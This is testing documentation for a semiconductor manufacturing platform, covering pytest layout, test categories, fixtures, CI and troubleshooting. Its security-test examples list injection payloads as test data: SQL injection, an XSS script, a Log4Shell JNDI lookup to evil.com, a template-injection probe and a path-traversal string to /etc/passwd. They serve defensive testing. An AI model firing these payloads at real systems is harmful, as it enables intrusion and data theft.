# 🧪 Testing Framework Documentation

## Overview

This document provides comprehensive guidance for the semiconductor manufacturing platform's testing framework. Our testing strategy ensures production-grade quality through multi-layered validation covering unit tests, integration tests, performance tests, security tests, and end-to-end tests.

## Table of Contents

1. [Testing Philosophy](#testing-philosophy)
2. [Test Suite Architecture](#test-suite-architecture)
3. [Getting Started](#getting-started)
4. [Test Categories](#test-categories)
5. [Test Data Management](#test-data-management)
6. [CI/CD Integration](#cicd-integration)
7. [Performance Guidelines](#performance-guidelines)
8. [Security Testing](#security-testing)
9. [Compliance Testing](#compliance-testing)
10. [Troubleshooting](#troubleshooting)

## Testing Philosophy

### Quality Standards
- **95%+ Code Coverage**: All production code must maintain high test coverage
- **Fast Feedback**: Unit tests complete in <5 minutes
- **Realistic Testing**: Integration tests use real services in containers
- **Production Parity**: Test environments mirror production configurations
- **Compliance First**: All tests validate FDA 21 CFR Part 11 requirements

### Test Pyramid Structure
```
        /\
       /  \     E2E Tests (Few, Slow, High Value)
      /____\
     /      \   Integration Tests (Some, Medium Speed)
    /_______\
   /         \  Unit Tests (Many, Fast, Focused)
  /___________\
```

## Test Suite Architecture

### Directory Structure
```
tests/
├── conftest.py                    # Global pytest configuration and fixtures
├── unit/                          # Fast, isolated unit tests
│   ├── test_api_gateway.py       # API endpoint testing
│   ├── test_services.py          # Business logic testing
│   └── test_utils.py             # Utility function testing
├── integration/                   # Multi-service integration tests
│   ├── test_service_integration.py
│   ├── test_database_integration.py
│   └── test_external_apis.py
├── e2e/                          # End-to-end workflow tests
│   ├── test_complete_workflows.py
│   ├── test_user_journeys.py
│   └── test_system_scenarios.py
├── performance/                   # Performance and load tests
│   ├── test_performance.py
│   ├── test_load_testing.py
│   └── test_stress_testing.py
├── security/                     # Security vulnerability tests
│   ├── test_security.py
│   ├── test_authentication.py
│   └── test_authorization.py
├── compliance/                   # Regulatory compliance tests
│   ├── test_fda_compliance.py
│   ├── test_audit_trails.py
│   └── test_data_integrity.py
├── fixtures/                     # Test data factories and fixtures
│   ├── manufacturing_factories.py
│   ├── user_factories.py
│   └── data_generators.py
└── utils/                        # Test utilities and helpers
    ├── test_helpers.py
    ├── database_utils.py
    └── api_utils.py
```

### Test Configuration
The `conftest.py` file provides centralized configuration including:
- Database fixtures with automatic cleanup
- Service containerization for integration tests
- Authentication and authorization fixtures
- Manufacturing data generators
- Performance monitoring utilities

## Getting Started

### Prerequisites
```bash
# Install test dependencies
pip install -r requirements-test.txt

# Start Docker services (for integration tests)
docker-compose -f docker-compose.test.yml up -d

# Verify environment
python -m pytest tests/unit/test_health.py -v
```

### Running Tests

#### Quick Start
```bash
# Run all unit tests
python run_tests.py --unit

# Run specific test file
python -m pytest tests/unit/test_api_gateway.py -v

# Run with coverage
python run_tests.py --unit --integration --coverage 0.90
```

#### Comprehensive Testing
```bash
# Run all test suites
python run_tests.py --all

# Run specific combinations
python run_tests.py --unit --integration --security

# Performance testing
python run_tests.py --performance --timeout 3600

# CI/CD pipeline simulation
python run_tests.py --all --parallel 8 --coverage 0.95 --fast-fail
```

### Test Markers
Tests are organized using pytest markers:
```python
@pytest.mark.unit          # Fast, isolated unit tests
@pytest.mark.integration   # Multi-service integration tests
@pytest.mark.e2e          # End-to-end workflow tests
@pytest.mark.performance  # Performance and load tests
@pytest.mark.security     # Security vulnerability tests
@pytest.mark.compliance   # Regulatory compliance tests
@pytest.mark.slow         # Tests that take >30 seconds
@pytest.mark.database     # Tests requiring database
@pytest.mark.external     # Tests calling external services
```

## Test Categories

### 1. Unit Tests (`tests/unit/`)

**Purpose**: Fast, isolated testing of individual components

**Characteristics**:
- No external dependencies (mocked)
- Complete in <5 minutes
- 95%+ code coverage target
- Focus on business logic and edge cases

**Example**:
```python
@pytest.mark.unit
async def test_chip_inspection_scoring():
    """Test chip inspection scoring algorithm."""
    inspector = ChipInspector()
    
    # Test normal chip
    normal_chip = create_mock_chip(defect_count=0)
    score = await inspector.calculate_quality_score(normal_chip)
    assert score >= 0.95
    
    # Test defective chip
    defective_chip = create_mock_chip(defect_count=5)
    score = await inspector.calculate_quality_score(defective_chip)
    assert score < 0.80
```

### 2. Integration Tests (`tests/integration/`)

**Purpose**: Validate interactions between services

**Characteristics**:
- Real database connections
- Containerized external services
- Complete in <15 minutes
- Focus on service contracts and data flow

**Example**:
```python
@pytest.mark.integration
async def test_inspection_workflow_integration(db_session, kafka_producer):
    """Test complete inspection workflow integration."""
    
    # Create test batch
    batch = await BatchFactory.create_async()
    
    # Trigger inspection
    result = await inspection_service.process_batch(batch.id)
    
    # Verify database updates
    updated_batch = await db_session.get(Batch, batch.id)
    assert updated_batch.status == "inspected"
    
    # Verify Kafka message
    messages = await kafka_consumer.get_messages()
    assert any(msg.type == "inspection_complete" for msg in messages)
```

### 3. End-to-End Tests (`tests/e2e/`)

**Purpose**: Validate complete business workflows

**Characteristics**:
- Full system integration
- Complete in <30 minutes
- User perspective testing
- Critical business scenarios

**Example**:
```python
@pytest.mark.e2e
async def test_quality_alert_complete_workflow(authenticated_client):
    """Test complete quality alert workflow."""
    
    # Simulate quality issue detection
    defective_batch = await create_defective_batch()
    
    # Trigger quality alert
    response = await authenticated_client.post(
        f"/batches/{defective_batch.id}/trigger-alert"
    )
    assert response.status_code == 201
    
    # Verify alert propagation
    alerts = await authenticated_client.get("/alerts")
    assert len(alerts.json()) > 0
    
    # Verify notification sent
    notifications = await get_test_notifications()
    assert any("Quality Alert" in n.subject for n in notifications)
```

### 4. Performance Tests (`tests/performance/`)

**Purpose**: Validate system performance and scalability

**Characteristics**:
- Load testing with realistic scenarios
- Performance regression detection
- SLA validation
- Resource usage monitoring

**Service Level Agreements (SLAs)**:
- **API Response Time**: P95 < 1 second
- **ML Inference**: < 500ms per prediction
- **Database Queries**: < 100ms average
- **Throughput**: > 5 requests/second sustained

**Example**:
```python
@pytest.mark.performance
class TestInspectionPerformance:
    """Performance tests for inspection service."""
    
    def test_concurrent_inspections(self):
        """Test concurrent inspection processing."""
        
        # Configure load test
        load_test = LoadTest(
            users=50,
            spawn_rate=5,
            duration=300  # 5 minutes
        )
        
        # Define user behavior
        @load_test.task(weight=3)
        def inspect_batch(user):
            batch_id = user.create_test_batch()
            response = user.client.post(f"/inspect/{batch_id}")
            assert response.status_code == 200
            assert response.elapsed.total_seconds() < 0.5
        
        # Run load test
        results = load_test.run()
        
        # Validate SLAs
        assert results.avg_response_time < 1.0
        assert results.p95_response_time < 2.0
        assert results.failure_rate < 0.01
```

### 5. Security Tests (`tests/security/`)

**Purpose**: Validate security controls and vulnerability prevention

**Characteristics**:
- OWASP Top 10 coverage
- Authentication and authorization testing
- Input validation and sanitization
- Data protection validation

**Example**:
```python
@pytest.mark.security
class TestSecurityControls:
    """Security vulnerability tests."""
    
    async def test_sql_injection_prevention(self, client):
        """Test SQL injection attack prevention."""
        
        # Attempt SQL injection
        malicious_input = "'; DROP TABLE batches; --"
        response = await client.get(f"/batches/search?query={malicious_input}")
        
        # Verify attack was blocked
        assert response.status_code in [400, 422]
        
        # Verify database integrity
        batch_count = await db.execute("SELECT COUNT(*) FROM batches")
        assert batch_count > 0  # Table still exists
    
    async def test_unauthorized_access_prevention(self, client):
        """Test unauthorized access prevention."""
        
        # Attempt unauthorized access
        response = await client.get("/admin/users")
        assert response.status_code == 401
        
        # Attempt with invalid token
        headers = {"Authorization": "Bearer invalid_token"}
        response = await client.get("/admin/users", headers=headers)
        assert response.status_code == 401
```

## Test Data Management

### Factory Pattern
We use Factory Boy for creating realistic test data:

```python
# Manufacturing Factories
class BatchFactory(factory.Factory):
    class Meta:
        model = Batch
    
    batch_id = factory.Sequence(lambda n: f"BATCH_{n:06d}")
    product_line = factory.Faker("random_element", elements=["CPU", "GPU", "MCU"])
    created_at = factory.Faker("date_time_this_month")
    status = "in_progress"

class ChipFactory(factory.Factory):
    class Meta:
        model = Chip
    
    chip_id = factory.Sequence(lambda n: f"CHIP_{n:08d}")
    batch = factory.SubFactory(BatchFactory)
    position_x = factory.Faker("random_int", min=1, max=100)
    position_y = factory.Faker("random_int", min=1, max=100)
    quality_score = factory.Faker("random_number", digits=3, fix_len=True)

# Usage in tests
@pytest.fixture
async def sample_batch():
    """Create a sample batch for testing."""
    return await BatchFactory.create_async()

@pytest.fixture  
async def defective_chips():
    """Create chips with known defects."""
    return await ChipFactory.create_batch_async(
        5, 
        quality_score__lt=0.5  # Force low quality scores
    )
```

### Test Data Cleanup
Automatic cleanup ensures test isolation:

```python
@pytest.fixture(autouse=True)
async def cleanup_test_data(db_session):
    """Automatically cleanup test data after each test."""
    yield
    
    # Cleanup in dependency order
    await db_session.execute(delete(QualityAlert))
    await db_session.execute(delete(Inspection))
    await db_session.execute(delete(Chip))
    await db_session.execute(delete(Batch))
    await db_session.commit()
```

## CI/CD Integration

### GitHub Actions Workflow
```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install dependencies
      run: |
        pip install -r requirements-test.txt
    
    - name: Run unit tests
      run: |
        python run_tests.py --unit --coverage 0.95
    
    - name: Run integration tests
      run: |
        python run_tests.py --integration
    
    - name: Run security tests
      run: |
        python run_tests.py --security
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
```

### Quality Gates
Tests enforce quality gates:

```python
# Quality gate configuration
QUALITY_GATES = {
    "coverage_threshold": 0.95,
    "performance_sla": {
        "api_p95_response_time": 1.0,
        "ml_inference_time": 0.5,
        "database_query_time": 0.1
    },
    "security_score": 0.95,
    "compliance_score": 1.0
}
```

## Performance Guidelines

### Optimization Strategies

#### Test Execution Speed
1. **Parallel Execution**: Use pytest-xdist for parallel test runs
2. **Test Isolation**: Minimize shared state and dependencies
3. **Resource Pooling**: Reuse database connections and services
4. **Smart Fixtures**: Use session-scoped fixtures for expensive setup

#### Performance Test Design
1. **Realistic Load**: Use production-representative data volumes
2. **Gradual Ramp-up**: Start with low load and gradually increase
3. **SLA Validation**: Assert performance requirements explicitly
4. **Resource Monitoring**: Track CPU, memory, and I/O usage

### Example Performance Test
```python
@pytest.mark.performance
class TestDatabasePerformance:
    """Database performance validation."""
    
    async def test_batch_query_performance(self, db_session, large_dataset):
        """Test batch query performance with large dataset."""
        
        # Setup: Create 10,000 batches
        await BatchFactory.create_batch_async(10000)
        
        # Performance test
        start_time = time.time()
        batches = await db_session.execute(
            select(Batch).where(Batch.status == "completed")
        )
        query_time = time.time() - start_time
        
        # Validate SLA
        assert query_time < 0.1, f"Query took {query_time:.3f}s, expected <0.1s"
        assert len(batches.all()) > 0
```

## Security Testing

### OWASP Top 10 Coverage

Our security tests cover all OWASP Top 10 vulnerabilities:

1. **Injection**: SQL injection, NoSQL injection, LDAP injection
2. **Broken Authentication**: Session management, password policies
3. **Sensitive Data Exposure**: Data encryption, PII protection
4. **XML External Entities (XXE)**: XML parsing security
5. **Broken Access Control**: Authorization bypass attempts
6. **Security Misconfiguration**: Default credentials, debug modes
7. **Cross-Site Scripting (XSS)**: Input sanitization
8. **Insecure Deserialization**: Pickle/JSON safety
9. **Known Vulnerabilities**: Dependency scanning
10. **Insufficient Logging**: Audit trail validation

### Security Test Example
```python
@pytest.mark.security
class TestOWASPCompliance:
    """OWASP Top 10 security tests."""
    
    async def test_injection_prevention(self, client):
        """Test various injection attack vectors."""
        
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/payload}",
            "{{7*7}}",  # Template injection
            "../../../etc/passwd"  # Directory traversal
        ]
        
        for payload in injection_payloads:
            response = await client.post("/search", json={"query": payload})
            assert response.status_code in [400, 422], f"Injection not blocked: {payload}"
    
    async def test_authentication_security(self, client):
        """Test authentication security controls."""
        
        # Test brute force protection
        for i in range(10):
            response = await client.post("/auth/login", json={
                "username": "admin",
                "password": "wrong_password"
            })
        
        # Account should be locked
        response = await client.post("/auth/login", json={
            "username": "admin", 
            "password": "correct_password"
        })
        assert response.status_code == 429  # Rate limited
```

## Compliance Testing

### FDA 21 CFR Part 11 Requirements

Our compliance tests validate FDA 21 CFR Part 11 requirements:

1. **Electronic Records**: Data integrity and authenticity
2. **Electronic Signatures**: Digital signature validation
3. **Audit Trails**: Comprehensive logging and immutability
4. **System Validation**: Computer system validation (CSV)
5. **Security Controls**: Access controls and data protection

### Compliance Test Example
```python
@pytest.mark.compliance
class TestFDACompliance:
    """FDA 21 CFR Part 11 compliance tests."""
    
    async def test_audit_trail_integrity(self, db_session, authenticated_user):
        """Test audit trail completeness and integrity."""
        
        # Perform auditable action
        batch = await BatchFactory.create_async()
        await inspection_service.update_status(batch.id, "completed", authenticated_user)
        
        # Verify audit trail
        audit_logs = await db_session.execute(
            select(AuditLog).where(AuditLog.entity_id == batch.id)
        )
        
        log_entries = audit_logs.all()
        assert len(log_entries) > 0
        
        # Validate required fields
        for log in log_entries:
            assert log.user_id == authenticated_user.id
            assert log.timestamp is not None
            assert log.action is not None
            assert log.old_value is not None
            assert log.new_value is not None
            assert log.ip_address is not None
    
    async def test_electronic_signature_validation(self, client, signing_user):
        """Test electronic signature requirements."""
        
        # Create inspection requiring signature
        batch = await BatchFactory.create_async()
        
        # Attempt to approve without signature
        response = await client.post(f"/batches/{batch.id}/approve")
        assert response.status_code == 400
        
        # Approve with valid electronic signature
        signature_data = {
            "user_id": signing_user.id,
            "password": "user_password",
            "meaning": "Approved for release",
            "timestamp": datetime.utcnow().isoformat()
        }
        
        response = await client.post(
            f"/batches/{batch.id}/approve",
            json={"signature": signature_data}
        )
        assert response.status_code == 200
        
        # Verify signature was recorded
        signatures = await db_session.execute(
            select(ElectronicSignature).where(
                ElectronicSignature.batch_id == batch.id
            )
        )
        assert len(signatures.all()) == 1
```

## Troubleshooting

### Common Issues

#### Test Environment Setup
```bash
# Issue: Docker services not starting
docker-compose -f docker-compose.test.yml down
docker-compose -f docker-compose.test.yml up -d --force-recreate

# Issue: Database connection errors
export DATABASE_URL="postgresql://test:test@localhost:5432/test_db"
python -c "from services.database import engine; print(engine.url)"

# Issue: Permission errors
sudo chown -R $(whoami):$(whoami) test-results/
chmod -R 755 test-results/
```

#### Test Failures
```bash
# Debug specific test
python -m pytest tests/unit/test_api_gateway.py::test_specific_function -v -s

# Run with debugging
python -m pytest --pdb tests/failing_test.py

# Check test coverage
python -m pytest --cov=services --cov-report=html
open htmlcov/index.html
```

#### Performance Issues
```bash
# Profile test execution
python -m pytest --profile tests/performance/

# Monitor resource usage
python run_tests.py --performance --verbose

# Check for memory leaks
python -m pytest --memray tests/unit/
```

### Test Data Issues
```bash
# Reset test database
python scripts/reset_test_db.py

# Cleanup test containers
docker-compose -f docker-compose.test.yml down -v

# Verify test fixtures
python -c "from tests.fixtures.manufacturing_factories import BatchFactory; print(BatchFactory.build())"
```

### Integration Test Debugging
```bash
# Check service health
curl http://localhost:8080/health
curl http://localhost:6379/ping  # Redis
curl http://localhost:9092/      # Kafka

# View service logs
docker-compose -f docker-compose.test.yml logs postgres
docker-compose -f docker-compose.test.yml logs redis
docker-compose -f docker-compose.test.yml logs kafka
```

## Best Practices

### Test Writing Guidelines

1. **Test Naming**: Use descriptive names that explain the scenario
   ```python
   # Good
   def test_batch_approval_requires_quality_score_above_threshold():
   
   # Bad  
   def test_batch():
   ```

2. **Test Structure**: Follow Arrange-Act-Assert pattern
   ```python
   async def test_inspection_scoring():
       # Arrange
       chip = await ChipFactory.create_async(defect_count=3)
       inspector = ChipInspector()
       
       # Act
       score = await inspector.calculate_score(chip)
       
       # Assert
       assert 0.0 <= score <= 1.0
       assert score < 0.8  # Defective chips score low
   ```

3. **Test Independence**: Each test should be isolated and self-contained
   ```python
   @pytest.fixture(autouse=True)
   async def isolate_test(db_session):
       """Ensure test isolation."""
       yield
       await db_session.rollback()
   ```

4. **Error Testing**: Test both success and failure scenarios
   ```python
   async def test_batch_processing_with_invalid_data():
       with pytest.raises(ValidationError) as exc_info:
           await batch_service.process(invalid_batch_data)
       
       assert "batch_id" in str(exc_info.value)
   ```

### Performance Optimization

1. **Use Fast Fixtures**: Prefer function-scoped over session-scoped when possible
2. **Mock External Services**: Avoid real API calls in unit tests
3. **Parallel Execution**: Use pytest-xdist for CPU-bound tests
4. **Resource Cleanup**: Always cleanup test resources

### Security Testing

1. **Test All Input Vectors**: Forms, APIs, file uploads, etc.
2. **Validate Error Messages**: Don't leak sensitive information
3. **Test Authentication Flows**: Login, logout, session management
4. **Check Authorization**: Role-based access controls

## Conclusion

This testing framework provides comprehensive quality assurance for our semiconductor manufacturing platform. By following these guidelines and utilizing the provided tools, development teams can maintain high code quality, ensure system reliability, and meet regulatory compliance requirements.

For additional support or questions, refer to the team wiki or contact the QA engineering team.

---

*Last Updated: December 2024*
*Version: 1.0*